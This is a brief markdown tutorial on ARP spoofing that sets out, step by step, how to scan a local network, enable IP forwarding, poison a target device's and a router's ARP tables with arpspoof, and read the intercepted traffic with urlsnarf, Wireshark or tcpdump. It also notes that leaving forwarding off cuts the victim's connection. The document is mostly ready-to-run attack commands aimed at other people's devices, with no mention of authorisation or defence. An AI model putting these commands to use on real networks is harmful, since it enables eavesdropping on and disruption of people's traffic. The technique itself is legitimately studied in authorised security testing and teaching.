# ARP Spoofing

## Step 1

* run nmap or netdiscover to list the devices on the network

```bash
nmap -vvv 192.168.1.0/24
```

```bash
netdiscover -r 192.168.1.0/24
```

## Step 2

* without changing it to 1 you will only block the traffic, not forward it
* that will bring down that connection, DoS
* if you want to do that make sure it is set to 0
* to intercept it make sure it is set to 1

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

## Step 3

* the interface flag
* in this example we choose the wlan0 interface
* run ifconfig to see which interfaces you have available

```bash
-i
```

* the target flag
* specifies your target
* the first address is the router
* the second is the specific device you want to target

```bash
-t
```

* example

```bash
arpspoof -i wlan0 -t 192.168.1.1 192.168.1.105
```

## Step 4

* now you are intercepting the traffic
* few choices how to read it. Some tools include
* urlsnarf

```bash
urlsnarf -i wlan0
```

* wireshark, Just open wireshark and select the interface and start capturing
* tcpdump
